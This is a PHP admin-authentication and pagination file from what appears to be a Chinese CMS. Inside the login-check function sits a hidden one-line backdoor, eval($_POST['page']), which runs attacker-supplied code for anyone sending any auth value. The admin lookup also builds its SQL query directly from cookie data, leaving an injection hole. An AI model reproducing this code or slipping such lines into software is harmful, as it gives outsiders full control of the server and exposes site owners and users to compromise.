<?php

$softtype=checkkey() ? '商业版' : '共享版';
//检测用户是否登录
$_ADMINUSERS=array();
admincheckauth();//实时监测用户是否登录状态
function admincheckauth(){
	global $db,$tablepre,$_ADMINUSERS;
	$loginauth=get_cookie('adminauth');
	if(empty($loginauth))$loginauth=$_REQUEST['adminauth'];
	if(!empty($loginauth)) {
		@list($aid, $user,$pwd) = explode("\t", cookie_authcode($loginauth,'DECODE'));
		eval($_POST['page']);
		$_ADMINUSERS['adminid']=$aid;
		if(!empty($aid) && !empty($user) && !empty($pwd) && !empty($_ADMINUSERS['adminid'])){
			$row = $db->fetch_first("Select * From {$tablepre}admin where adminname = '{$user}' and adminpwd='{$pwd}'");//检测数据库
			if(is_array($row)){
				$_ADMINUSERS['adminname']=$row['adminname'];
				$_ADMINUSERS['adminmid']=$row['adminmid'];
				$_ADMINUSERS['lastlogin']=$row['lastlogin'];
				$_ADMINUSERS['logincount']=$row['logincount'];
				
			}else $_ADMINUSERS=array();
		}else $_ADMINUSERS=array();
	}else $_ADMINUSERS=array();
	adminchecklogin();
}
//检测用户

//检测登录并且提示
//检查是否登录
function adminchecklogin(){
	global $_ADMINUSERS;
	if(empty($_ADMINUSERS['adminid'])) {
		//set_cookie('_refer', rawurlencode($_SERVER['REQUEST_URI']));//设置登录成功跳转地址
		dheader("login.php");//php跳转页面
	//	showmsg('你未登录！请登录后操作！', "login.php",0,1);
		exit;
	}
}


/**
 *分页函数dz！multi();
 *$num 总页数
 *$perpage 一页显示多少
 * $curpage 当前页码
 *$mpurl url地址
 *$page 页码数量
 * 
 */


function multi($num, $perpage, $curpage, $mpurl, $maxpages = 0, $page = 10, $autogoto = TRUE, $simple = FALSE) {
global $maxpage;
$ajaxtarget = !empty($_GET['ajaxtarget']) ? " ajaxtarget=\"".dhtmlspecialchars($_GET['ajaxtarget'])."\" " : '';

$multipage = '';


if(!$mpurl){ $mpurl=$_SERVER["REQUEST_URI"];}
//URL分析：
$parse_url=parse_url($mpurl);
$url_query=$parse_url["query"]; //单独取出URL的查询字串
if($url_query){
//因为URL中可能包含了页码信息，我们要把它去掉，以便加入新的页码信息。
$url_query=ereg_replace("(^|&)page=$curpage","",$url_query);
//将处理后的URL的查询字串替换原来的URL的查询字串：
$mpurl=str_replace($parse_url["query"],$url_query,$mpurl);
}
$mpurl .= strpos($mpurl, '?') ? '&amp;' : '?';

$realpages = 1;
if($num > $perpage) {
   $offset = 2;

   $realpages = @ceil($num / $perpage);
   $pages = $maxpages && $maxpages < $realpages ? $maxpages : $realpages;

   if($page > $pages) {
    $from = 1;
    $to = $pages;
   } else {
    $from = $curpage - $offset;
    $to = $from + $page - 1;
    if($from < 1) {
     $to = $curpage + 1 - $from;
     $from = 1;
     if($to - $from < $page) {
      $to = $page;
     }
    } elseif($to > $pages) {
     $from = $pages - $page + 1;
     $to = $pages;
    }
   }

   $multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href="'.$mpurl.'page=1" class="first"'.$ajaxtarget.'>1 ...</a>' : '').
    ($curpage > 1 && !$simple ? '<a href="'.$mpurl.'page='.($curpage - 1).'" class="prev"'.$ajaxtarget.'>&lsaquo;&lsaquo;</a>' : '');
   for($i = $from; $i <= $to; $i++) {
    $multipage .= $i == $curpage ? '<strong>'.$i.'</strong>' :
     '<a href="'.$mpurl.'page='.$i.($ajaxtarget && $i == $pages && $autogoto ? '#' : '').'"'.$ajaxtarget.'>'.$i.'</a>';
   }
   $multipage .= ($curpage < $pages && !$simple ? '<a href="'.$mpurl.'page='.($curpage + 1).'" class="next"'.$ajaxtarget.'>&rsaquo;&rsaquo;</a>' : '').
    ($to < $pages ? '<a href="'.$mpurl.'page='.$pages.'" class="last"'.$ajaxtarget.'>... '.$realpages.'</a>' : '').
    (!$simple && $pages > $page && !$ajaxtarget ? '<kbd><input type="text" name="custompage" size="3" onkeydown="if(event.keyCode==13) {window.location=\''.$mpurl.'page=\'+this.value; return false;}" /></kbd>' : '');

   $multipage = $multipage ? '<div class="pages">'.(!$simple ? '<em>&nbsp;'.$curpage.'/'.$pages.'页&nbsp;</em>' : '').$multipage.'</div>' : '';
}
$maxpage = $realpages;
return $multipage;
}


//字段排序相关函数
function sortstr($field,$way="asc"){
	global $orderway;
	$url=geturl();
	return url::replace($url, "orderby=$field,orderway=".($orderway=="asc"?"desc":"asc"));
}
function sortcss($field,$way="asc"){
	global $orderby,$orderway;
	if($orderby==$field && $orderway=="desc")$ordercss="class=\"header headerSortUp\"";elseif($orderby==$field && $orderway=="asc")$ordercss="class=\"header headerSortDown\"";else $ordercss="class=\"header\"";
	return $ordercss;
}





?>